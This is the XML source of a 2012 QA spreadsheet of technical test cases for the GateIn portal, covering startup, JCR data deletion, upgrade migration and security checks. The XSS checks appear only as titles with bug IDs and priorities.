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0256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0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9134in"/>
    </style:style>
    <style:style style:name="co20" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.7126in"/>
    </style:style>
    <style:style style:name="co21" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.2437in"/>
    </style:style>
    <style:style style:name="co22" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.2189in"/>
    </style:style>
    <style:style style:name="co23" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.6165in"/>
    </style:style>
    <style:style style:name="co24" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.1756in"/>
    </style:style>
    <style:style style:name="co25" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.2709in"/>
    </style:style>
    <style:style style:name="co26" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.6528in"/>
    </style:style>
    <style:style style:name="co27" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.6366in"/>
    </style:style>
    <style:style style:name="co28" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="6.3575in"/>
    </style:style>
    <style:style style:name="co29" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.4098in"/>
    </style:style>
    <style:style style:name="co30" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.2339in"/>
    </style:style>
    <style:style style:name="co31" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="1.1902in"/>
    </style:style>
    <style:style style:name="co32" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.0925in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1.2638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9" style:family="table-row">
      <style:table-row-properties style:row-height="0.302in" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro20" style:family="table-row">
      <style:table-row-properties style:row-height="0.3728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6736in" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro23" style:family="table-row">
      <style:table-row-properties style:row-height="0.2591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1965in" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro26" style:family="table-row">
      <style:table-row-properties style:row-height="0.2071in" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro27" style:family="table-row">
      <style:table-row-properties style:row-height="0.228in" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro28" style:family="table-row">
      <style:table-row-properties style:row-height="1.4193in" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro29" style:family="table-row">
      <style:table-row-properties style:row-height="1.1138in" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro30" style:family="table-row">
      <style:table-row-properties style:row-height="1.4252in" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro31" style:family="table-row">
      <style:table-row-properties style:row-height="0.3366in" fo:break-before="auto" style:use-optimal-row-height="tru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5" style:family="table-cell" style:parent-style-name="Default">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="ce66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fo:wrap-option="wrap"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10pt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8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8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97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02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40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4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language-asian="en" style:country-asian="US" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-name-complex="Tahoma2" style:language-complex="en" style:country-complex="US" style:font-style-complex="normal" style:font-weight-complex="bold" style:text-emphasize="none" style:font-relief="none"/>
    </style:style>
    <style:style style:name="ce124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name-complex="Tahoma2" style:language-complex="en" style:country-complex="US" style:font-style-complex="normal" style:font-weight-complex="bold" style:text-emphasize="none" style:font-relief="none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2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3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133" style:family="table-cell" style:parent-style-name="Default">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="10pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="ce13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13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13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8" style:family="table-cell" style:parent-style-name="Default">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" fo:font-weight="bold" style:font-name-asian="Tahoma"/>
    </style:style>
    <style:style style:name="ce13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40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order="0.0008in solid #000000"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10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>
      <style:table-cell-properties fo:wrap-option="wrap" fo:border="0.0008in solid #000000"/>
      <style:text-properties style:font-name="Arial"/>
    </style:style>
    <style:style style:name="ce148" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:border="0.0008in solid #000000"/>
      <style:text-properties style:font-name="Arial"/>
    </style:style>
    <style:style style:name="ce1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style:font-name-asian="Tahoma" style:font-size-asian="10pt" style:font-size-complex="10pt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" style:font-size-asian="10pt"/>
    </style:style>
    <style:style style:name="ce15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7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7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fo:color="#000000" fo:font-weight="bold" style:font-name-asian="Arial" style:font-name-complex="Tahoma1"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name-asian="ＭＳ Ｐゴシック" style:font-name-complex="Tahoma1"/>
    </style:style>
    <style:style style:name="T8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1">
          <table:table-cell table:style-name="ce4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45" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce40"/>
          <table:table-cell table:style-name="ce40" table:number-columns-spanned="3" table:number-rows-spanned="1"/>
          <table:covered-table-cell table:style-name="ce40"/>
          <table:covered-table-cell table:style-name="ce40"/>
          <table:table-cell table:style-name="ce40" table:number-columns-repeated="248"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1"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9">
          <table:table-cell table:style-name="ce42"/>
          <table:table-cell table:number-columns-repeated="2"/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0">
          <table:table-cell table:style-name="ce42"/>
          <table:table-cell table:style-name="ce46" office:value-type="string">
            <text:p>GateIn TECHNICAL TEST CASES</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce42" table:number-columns-repeated="4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Version:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce55" office:value-type="float" office:value="1.1">
            <text:p>1.1</text:p>
          </table:table-cell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Issue date:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce56" office:value-type="float" office:value="41131">
            <text:p>10-Aug-12</text:p>
          </table:table-cell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Product Name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce55" office:value-type="string">
            <text:p>GateIn</text:p>
          </table:table-cell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Product Code:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce55" office:value-type="string">
            <text:p>EXOGTN</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce42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2"/>
          <table:table-cell table:style-name="ce47" office:value-type="string">
            <text:p>Module:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce57" office:value-type="string">
            <text:p>Technical</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce64"/>
          <table:table-cell table:style-name="ce42" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce40" table:number-columns-repeated="249"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce43"/>
          <table:table-cell table:style-name="ce47" office:value-type="string">
            <text:p>Total Cases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce58" table:formula="of:=[Summary_Report.F15]" office:value-type="float" office:value="10">
            <text:p>10</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4"/>
          <table:table-cell table:style-name="ce43" table:number-columns-repeated="248"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell table:style-name="ce43"/>
          <table:table-cell table:style-name="ce48" office:value-type="string">
            <text:p>Test Status:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce59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number-columns-repeated="6"/>
          <table:table-cell table:style-name="ce43" table:number-columns-repeated="248"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell table:style-name="ce44"/>
          <table:table-cell table:style-name="ce49" office:value-type="string">
            <text:p>Record of change:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce40" table:number-columns-repeated="5"/>
          <table:table-cell table:style-name="ce44" table:number-columns-repeated="248"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell table:style-name="ce44"/>
          <table:table-cell table:style-name="ce50" office:value-type="string">
            <text:p>Effective Date</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce60" office:value-type="string">
            <text:p>Version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce60" office:value-type="string">
            <text:p>Change description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce60" office:value-type="string">
            <text:p>Originator</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce112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51" office:value-type="string">
            <text:p>31/05/2010</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce61" office:value-type="string">
            <text:p>1.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce103" office:value-type="string">
            <text:p>New document</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce109" office:value-type="string">
            <text:p>Arthur.peltier</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce110"/>
          <table:table-cell table:style-name="ce114"/>
          <table:table-cell table:style-name="ce43"/>
          <table:table-cell table:style-name="ce44" table:number-columns-repeated="247"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce43"/>
          <table:table-cell table:style-name="ce52" office:value-type="date" office:date-value="2012-08-10">
            <text:p>10-Aug-2012</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce61" office:value-type="float" office:value="1.1">
            <text:p>1.1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce61" office:value-type="string">
            <text:p>Update XSS cases</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce104" office:value-type="string">
            <text:p>hang.nguyen</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce110"/>
          <table:table-cell table:style-name="ce114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1"/>
          <table:table-cell table:style-name="ce104" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce110"/>
          <table:table-cell table:style-name="ce115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2"/>
          <table:table-cell table:style-name="ce105"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115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2"/>
          <table:table-cell table:style-name="ce105"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce116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2"/>
          <table:table-cell table:style-name="ce106"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115"/>
          <table:table-cell table:style-name="ce43" table:number-columns-repeated="248"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro21">
          <table:table-cell table:style-name="ce43"/>
          <table:table-cell table:style-name="ce53"/>
          <table:table-cell table:style-name="ce62"/>
          <table:table-cell table:style-name="ce107"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115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3"/>
          <table:table-cell table:style-name="ce62"/>
          <table:table-cell table:style-name="ce107"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115"/>
          <table:table-cell table:style-name="ce40"/>
          <table:table-cell table:style-name="ce43" table:number-columns-repeated="247"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce40"/>
          <table:table-cell table:style-name="ce53"/>
          <table:table-cell table:style-name="ce62"/>
          <table:table-cell table:style-name="ce106"/>
          <table:table-cell table:style-name="ce110" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115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style-name="ce53"/>
          <table:table-cell table:style-name="ce62"/>
          <table:table-cell table:style-name="ce106"/>
          <table:table-cell table:style-name="ce107" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115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style-name="ce53"/>
          <table:table-cell table:style-name="ce62"/>
          <table:table-cell table:style-name="ce106"/>
          <table:table-cell table:style-name="ce107" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce115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style-name="ce54"/>
          <table:table-cell table:style-name="ce63"/>
          <table:table-cell table:style-name="ce108"/>
          <table:table-cell table:style-name="ce111" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce117"/>
          <table:table-cell table:style-name="ce40" table:number-columns-repeated="248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/>
          <table:table-cell table:number-columns-repeated="7"/>
          <table:table-cell table:style-name="ce40" table:number-columns-repeated="247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22">
          <table:table-cell table:style-name="ce118" office:value-type="string" table:number-columns-spanned="2" table:number-rows-spanned="1">
            <text:p><text:span text:style-name="T3">Chec</text:span><text:span text:style-name="T3">k List</text:span></text:p>
            <text:p><text:span text:style-name="T5">Based on </text:span><text:span text:style-name="T5">Product </text:span><text:span text:style-name="T5">build </text:span><text:span text:style-name="T5">version: </text:span></text:p>
          </table:table-cell>
          <table:covered-table-cell table:style-name="ce121"/>
          <table:table-cell table:style-name="ce143" office:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="2">
            <text:p>BugID</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce143" office:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="2">
            <text:p>Priority</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce143" office:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="2">
            <text:p>Selenium</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce59" table:number-columns-repeated="251"/>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell table:style-name="ce119" office:value-type="string">
            <text:p>Id</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce121" office:value-type="string">
            <text:p>Main cases</text:p>
          </table:table-cell>
          <table:covered-table-cell table:style-name="ce143" office:value-type="string">
            <text:p>Priority</text:p>
          </table:covered-table-cell>
          <table:covered-table-cell table:style-name="ce143" office:value-type="string">
            <text:p>Priority</text:p>
          </table:covered-table-cell>
          <table:covered-table-cell table:style-name="ce59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1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144"/>
          <table:table-cell table:style-name="ce144" office:value-type="string">
            <text:p>High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2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144"/>
          <table:table-cell table:style-name="ce144" office:value-type="string">
            <text:p>High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3.001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144"/>
          <table:table-cell table:style-name="ce144" office:value-type="string">
            <text:p>Medium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41" office:value-type="string">
            <text:p>Tech_PRL_03.002</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Test Direct Input of a url with root user/pwd to connect to “Registry Page”</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce144"/>
          <table:table-cell table:style-name="ce144" office:value-type="string">
            <text:p>Medium</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce148"/>
          <table:table-cell table:style-name="ce59" table:number-columns-repeated="251"/>
        </table:table-row>
        <table:table-row table:style-name="ro24">
          <table:table-cell table:style-name="ce41" office:value-type="string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45" office:value-type="string">
            <text:p><text:span text:style-name="T6"/></text:p>
            <text:p><text:span text:style-name="T6">EXOGTN-408</text:span></text:p>
            <text:p><text:span text:style-name="T6"/></text:p>
            <text:p><text:span text:style-name="T6">EXOGTN-406</text:span>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12">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce122" office:value-type="string">
            <text:p>Check XSS in membership description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-1153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25">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_06</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce123" office:value-type="string">
            <text:p>Check XSS in dashboard new page creation by basic</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-403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25">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_07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46" office:value-type="string">
            <text:p>EXOGTN-414</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce147" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell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3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4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40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6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27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3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9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1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4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7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8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39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42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4" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce148"/>
          <table:table-cell table:style-name="ce59" table:number-columns-repeated="251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style-name="ce59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Data" table:style-name="ta1" table:print="false">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <table:table-column table:style-name="co11" table:default-cell-style-name="ce65"/>
        <table:table-column table:style-name="co12" table:default-cell-style-name="ce65"/>
        <table:table-column table:style-name="co13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0" table:default-cell-style-name="ce65"/>
        <table:table-row table:style-name="ro1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79"/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="Default"/>
          <table:table-cell table:style-name="ce94" office:value-type="string">
            <text:p>Passed</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.K$7:.K$1019];[.$K1])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.L$7:.L$1019];[.$K1])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.M$7:.M$1019];[.$K1])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.N$7:.N$1019];[.$K1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/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="4"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="Default"/>
          <table:table-cell table:style-name="ce94" office:value-type="string">
            <text:p>Failed</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.K$7:.K$1019];[.$K2])" office:value-type="float" office:value="0">
            <text:p>0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/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce90"/>
          <table:table-cell table:style-name="Default"/>
          <table:table-cell table:style-name="ce94" office:value-type="string">
            <text:p>Blocked</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.K$7:.K$1019];[.$K3])" office:value-type="float" office:value="0">
            <text:p>0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Total Main Cases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7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79"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce91"/>
          <table:table-cell table:style-name="Default"/>
          <table:table-cell table:style-name="ce95" office:value-type="string">
            <text:p>Untested</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.K$7:.K$1019];[.$K4])" office:value-type="float" office:value="0">
            <text:p>0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8" table:number-columns-repeated="213"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="18"/>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce66"/>
          <table:table-cell table:style-name="ce72"/>
          <table:table-cell table:style-name="ce66" table:number-columns-repeated="7"/>
          <table:table-cell table:style-name="Default"/>
          <table:table-cell table:style-name="Default" office:value-type="string">
            <text:p>N/A</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="oooc:=COUNTIF([.K$7:.K$1019];[.$K5])" office:value-type="float" office:value="0">
            <text:p>0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66" table:number-columns-repeated="231"/>
          <table:table-cell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>
            <text:p>Tester</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>IE7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>FireFox3.5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>Comment/Bug</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73" table:number-columns-repeated="5"/>
          <table:table-cell table:style-name="ce99" table:number-columns-repeated="211"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="17"/>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce68" office:value-type="float" office:value="1">
            <text:p>1.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_01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1: Start GateIn</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>Run the tested GateIn binary</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>GateIn is up and running. Login and Logout works.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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4">
          <table:table-cell table:style-name="ce68"/>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_01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3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3" office:value-type="string">
            <text:p>Connexion to the JCR is ok</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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4">
          <table:table-cell table:style-name="ce68"/>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_01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3:Delete the specific data linked to a group in the JCR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83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7" office:value-type="string">
            <text:p>Node is deleted (ls to verify) and commited to the JCR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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5">
          <table:table-cell table:style-name="ce68"/>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_01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JCR / Crash / GroupData / Delete &amp; Use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83" office:value-type="string">
            <text:p>Step 4:Login in GateIn as admin and manipulate a user from the deleted group</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83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3" office:value-type="string">
            <text:p>The group still exists, the user can be manipulated as usual. </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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/>
          <table:table-cell table:style-name="ce41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7"/>
          <table:table-cell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6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8"/>
          <table:table-cell table:style-name="Default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</table:table>
      <table:table table:name="Migration_Upgrade" table:style-name="ta1" table:print="false">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <table:table-column table:style-name="co11" table:default-cell-style-name="ce65"/>
        <table:table-column table:style-name="co19" table:default-cell-style-name="ce65"/>
        <table:table-column table:style-name="co13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0" table:default-cell-style-name="ce65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79"/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce98" table:number-columns-repeated="220"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="18"/>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="4"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce70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/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce90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2">
          <table:table-cell/>
          <table:table-cell table:style-name="ce71" office:value-type="string">
            <text:p>Total Main Cases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7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79"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce91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number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell table:style-name="ce66"/>
          <table:table-cell table:style-name="ce72"/>
          <table:table-cell table:style-name="ce66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6" table:number-columns-repeated="232"/>
          <table:table-cell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>
            <text:p>Tester</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>IE7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>FireFox3.5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>Comment/Bug</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73" table:number-columns-repeated="5"/>
          <table:table-cell table:style-name="ce99" table:number-columns-repeated="211"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="17"/>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce68" office:value-type="float" office:value="1">
            <text:p>1.00</text:p>
          </table:table-cell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1:Run a version of GateIn a version lower than the one to test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92" table:number-columns-repeated="1"/>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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3">
          <table:table-cell table:style-name="ce68"/>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_02</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce77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2:Populate the database with different data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92" table:number-columns-repeated="1"/>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce93" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce100"/>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce68"/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3:Copy the modified database to the tested version of GateIn</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83"/>
          <table:table-cell table:style-name="ce87"/>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce101"/>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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7">
          <table:table-cell table:style-name="ce68"/>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_02</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce76" office:value-type="float" office:value="1">
            <text:p>1.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce80" office:value-type="string">
            <text:p>Upgrade / next version / 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83" office:value-type="string">
            <text:p>Step 4:Run the tested version of GateIn and verify that all data is still present and working</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>High</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce101"/>
          <table:table-cell table:style-name="ce92">
            <text:p>hang.nguyen</text:p>
          </table:table-cell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/>
          <table:table-cell table:style-name="ce41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number-columns-repeated="9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number-columns-repeated="247"/>
        </table:table-row>
        <table:table-row table:style-name="ro18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row table:style-name="ro18">
          <table:table-cell table:number-columns-repeated="256"/>
        </table:table-row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  <table:table-column table:style-name="co10" table:default-cell-style-name="ce65"/>
      </table:table>
      <table:table table:name="Security" table:style-name="ta1" table:print="false">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <table:table-column table:style-name="co11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table:style-name="ce65"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 table:style-name="ce65"/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce70" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce98" table:number-columns-repeated="220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0" table:number-columns-repeated="4"/>
          <table:table-cell table:style-name="ce65"/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce70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f:=COUNTIF([.L$7:.L$1016];[.$K2])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.M$7:.M$1016];[.$K2])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.N$7:.N$1016];[.$K2])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.O$7:.O$1016];[.$K2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1" office:value-type="string">
            <text:p>Functions List<text:span text:style-name="T4">:</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce74" table:number-columns-spanned="3" table:number-rows-spanned="1"/>
          <table:covered-table-cell table:style-name="ce78"/>
          <table:covered-table-cell table:style-name="ce75"/>
          <table:table-cell table:style-name="ce65"/>
          <table:table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce90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1016];[.$K3])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.M$7:.M$1016];[.$K3])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.N$7:.N$1016];[.$K3])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.O$7:.O$1016];[.$K3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5"/>
          <table:table-cell table:style-name="ce71" office:value-type="string">
            <text:p>Total Main Cases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce75" table:formula="of:=MAX([.A7:.A1002])" office:value-type="float" office:value="8" table:number-columns-spanned="3" table:number-rows-spanned="1">
            <text:p>8</text:p>
          </table:table-cell>
          <table:covered-table-cell table:style-name="ce79"/>
          <table:covered-table-cell table:style-name="ce79"/>
          <table:table-cell table:style-name="ce65"/>
          <table:table-cell table:style-name="ce79"/>
